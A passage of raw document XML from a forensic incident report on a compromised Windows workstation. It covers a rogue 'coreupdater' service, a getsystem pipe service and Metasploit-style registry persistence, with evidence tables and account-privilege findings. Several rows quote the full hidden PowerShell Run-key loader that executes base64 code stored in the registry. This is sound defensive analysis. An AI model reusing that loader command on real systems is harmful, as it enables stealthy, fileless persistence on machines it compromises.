              </w:rPr>
              <w:t>Service: key written</w:t>
              <w:br/>
              <w:t>C:\Windows\System32\coreupdater.exe</w:t>
              <w:br/>
              <w:t>coreupdater start=Automatic Win32OwnProcess</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_Services.csv#115</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:42:42.676537</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Services (Dissect)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>service: ts</w:t>
              <w:br/>
              <w:t>C:\Windows\System32\coreupdater.exe</w:t>
              <w:br/>
              <w:t>name=coreupdater | start=Auto Start (2) | type=Service - Own Process (0x10) | objectname=LocalSystem</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>dissect/services.jsonl#95</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:42:42.676537</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>C:\Windows\System32\coreupdater.exe</w:t>
              <w:br/>
              <w:t>System 7045 | Service Control Manager | A new service was installed in the system | Name: coreupdater | StartType: auto start | Account: LocalSystem | C:\Windows\System32\coreupdater.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#40866</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\System.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:43:14.990879</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>cmd.exe /c echo nehgye &amp;gt; \\.\pipe\nehgye</w:t>
              <w:br/>
              <w:t>System 7045 | Service Control Manager | A new service was installed in the system | Name: nehgye | StartType: demand start | Account: LocalSystem | cmd.exe /c echo nehgye &amp;gt; \\.\pipe\nehgye</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#40867</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\System.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>raw.vol_svclist</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>{"TreeDepth": "0", "Display": "coreupdater", "Name": "coreupdater", "Offset": "1402927956048", "Order": "662", "Start": "SERVICE_AUTO_START", "State": "SERVICE_STOPPED", "Type": "SERVICE_WIN32_OWN_PROCESS"}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.svclist.SvcList.jsonl#22</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-019: Persistence #1: HKLM Run value "coreupdate" + fileless payload in HKLM\Software\q9Z1bssi (Metasploit registry_persistence pattern), written 03:44:03 during the attacker session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B0000"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Critical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(recmd kroll)</w:t>
              <w:br/>
              <w:t>artifact:run keys</w:t>
              <w:br/>
              <w:t>evtx:microsoft-windows-shell-core%4operational.evtx</w:t>
              <w:br/>
              <w:t>evtx:windows powershell.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Category</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>persistence</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>MITRE ATT&amp;CK</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>T1547.001, T1112, T1059.001, T1027</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Period (UTC)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2020-09-19 03:44:03.540241 → 2020-09-19 05:08:40.797308</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Observed facts</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>SOFTWARE hive, key HKLM\Software\Microsoft\Windows\CurrentVersion\Run, LastWrite 2020-09-19 03:44:03.540241 UTC, value "coreupdate" = %COMSPEC% /b /c start /b /min powershell -nop -w hidden -c "sleep 0; iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((Get-Item 'HKLM:Software\q9Z1bssi').GetValue('JqxNhWJA'))))" (RECmd Kroll recmd_kroll_F.csv#7223; Dissect runkeys.jsonl#5). The other 3 HKLM Run values (SecurityHealth, VMware VM3DService Process, VMware User Process) are legitimate. The key write occurs 31 s after the getsystem service "nehgye" (7045 at 03:43:14) and 3 min after the coreupdater service (03:42:42), inside the RDP session of C137\Administrator (03:36:24-03:52:13). No file was written to disk around 03:43-03:44:30 ($J shows only ContentDeliveryManager temp files): the payload is stored only in the registry value HKLM\Software\q9Z1bssi\JqxNhWJA (the value itself was not extracted by the parsers). Trigger observed: at the next interactive logon of ricksanchez (SID -1106), Shell-Core 9707/9708 at 05:08:37 (evtxecmd_0.csv#20011/#20012, PID 1380) executed the Run command, PowerShell 600/400 at 05:08:40 show the HostApplication (evtxecmd_0.csv#40903, #40909), followed by the second Meterpreter session (already documented in F-010/F-016).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Analysis</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Random key/value names (q9Z1bssi / JqxNhWJA), cmd /b /c start /b /min powershell -nop -w hidden + iex(base64 from registry) is the exact template of Metasploit exploit/windows/local/registry_persistence, run through the SYSTEM Meterpreter session obtained by getsystem. Writing to HKLM requires admin/SYSTEM, which fits. As an HKLM Run value it runs at every interactive logon of ANY user, in that user's context: this is why it ran as ricksanchez (Domain Admin), which handed the attacker a Domain Admin token. Fileless: deleting only coreupdater.exe would not remove it. Both the Run value and q9Z1bssi must be deleted. This finding adds the persistence mechanics to F-010 (which covers the execution). Two independent sources: registry hive (RECmd/Dissect) and EVTX (Shell-Core + PowerShell).</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03:44:03.540241</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry (RECmd Kroll)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: key last written</w:t>
              <w:br/>
              <w:t>ROOT\Microsoft\Windows\CurrentVersion\Run</w:t>
              <w:br/>
              <w:t>Autoruns | Run (SYSTEM) | coreupdate=%COMSPEC% /b /c start /b /min powershell -nop -w hidden -c "sleep 0; iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((Get-Item 'HKLM:Software\q9Z1bssi').GetValue('JqxNhWJA'))))"</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/recmd_kroll_F.csv#7223</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\config\SOFTWARE</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:44:03.540241</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Run keys</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>run: ts</w:t>
              <w:br/>
              <w:t>Microsoft\Windows\CurrentVersion\Run</w:t>
              <w:br/>
              <w:t>name=coreupdate | command={"executable":"%COMSPEC%","args":["/b /c start /b /min powershell -nop -w hidden -c \"sleep 0; iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((Get-Item 'HKLM:Software\\q9Z1bssi').GetValue('JqxNhWJA'))))\""]}</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>dissect/runkeys.jsonl#5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>sysvol/windows/system32/config/SOFTWARE</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:37.533172</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>q9Z1bssi').GetValue('JqxNhWJA'))))"</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Shell-Core/Operational 9707 | Microsoft-Windows-Shell-Core | Started execution of command | q9Z1bssi').GetValue('JqxNhWJA'))))"</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#20011</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Microsoft-Windows-Shell-Core%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:37.674622</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>q9Z1bssi').GetValue('JqxNhWJA'))))"</w:t>
              <w:br/>
              <w:t>Microsoft-Windows-Shell-Core/Operational 9708 | Microsoft-Windows-Shell-Core | Finished execution of command | PID: 1380 | q9Z1bssi').GetValue('JqxNhWJA'))))"</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#20012</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Microsoft-Windows-Shell-Core%4Operational.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:40.484484</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Windows PowerShell 600 | PowerShell | Provider is Started | HostApplication=powershell -nop -w hidden -c sleep 0; iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((Get-Item 'HKLM:Software\q9Z1bssi').GetValue('JqxNhWJA'))))</w:t>
              <w:br/>
              <w:t xml:space="preserve"> | HostName=ConsoleHost</w:t>
              <w:br/>
              <w:t xml:space="preserve"> | HostVersion=5.1.19041.1</w:t>
              <w:br/>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#40903</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Windows PowerShell.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 05:08:40.797308</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1474"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3628"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>Windows PowerShell 400 | PowerShell | Engine state is changed from None to Available | HostApplication=powershell -nop -w hidden -c sleep 0; iex([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String((Get-Item 'HKLM:Software\q9Z1bssi').GetValue('JqxNhWJA'))))</w:t>
              <w:br/>
              <w:t xml:space="preserve"> | HostName=ConsoleHost</w:t>
              <w:br/>
              <w:t xml:space="preserve"> | HostVersion=5.1.19041.1</w:t>
              <w:br/>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#40909</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\System32\winevt\logs\Windows PowerShell.evtx</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.7 Accounts, authentication and privileges</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>I reviewed the Security events (4624/4625/4634/4647/4648/4672/4720/4722/4724/4728/4732/4738/4798/4799), TerminalServices LSM 21-25/39/40, RCM 261/1149, the SAM UserAccounts, the Terminal Server registry values and the memory token SIDs (getsids).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>F-021 (context):</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- All account creations happened during OOBE: WDAGUtilityAccount, defaultuser0 and the local Admin (RID 1001).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- The domain join at 21:42:15 used explicit C137\Administrator credentials (4648) and added Domain Admins to the local Administrators group.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- There was only one 4625, and it came from clock skew. There was no brute force against the workstation.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- I summarised logons per account: Admin local console until 03:17:00; ricksanchez and mortysmith type 2 on 2020-09-18 22:44-22:59; ricksanchez type 11/7 at 05:08:15; C137\Administrator type 3 Kerberos and type 10 from 10.42.85.10, 03:36:22-03:52:13.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>F-022 (medium):</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- At 22:55:33, ricksanchez (from his console session, LogonId 0x438E75) added -500, Domain Admins, Domain Users and mortysmith to Remote Desktop Users. This is probably admin configuration done before the incident, but it authorised the attacker's RDP path.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- fDenyTSConnections=0. The key's LastWrite (03:17:00) matches the end of the local Admin session.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>F-023 (high, EVTX + memory):</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- The attacker's session (LogonId 0x857E73) had SeDebug, SeLoadDriver and similar privileges. The coreupdater/Edge tokens contain Domain Admins (-512) and Enterprise Admins (-519), so no local privilege escalation was needed beyond getsystem.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- ricksanchez (Domain Admin per memory) made a cached type 11 logon at 05:08:15 at the start of the responder's acquisition. That logon set off the HKLM Run loader in a Domain Admin context.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>I added timeline events T-018 (logoff 03:52:13) and T-019 (RDU change), and IOC I-013 (the compromised C137\Administrator account).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>F-023: Attacker session privileges: C137\Administrator RDP logon (LogonId 0x857E73) holds Domain Admins + Enterprise Admins + SeDebugPrivilege; ricksanchez (Domain Admin) cached logon at 05:08 triggered the Run-key loader</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evtx:security.evtx</w:t>
              <w:br/>
              <w:t>memory</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
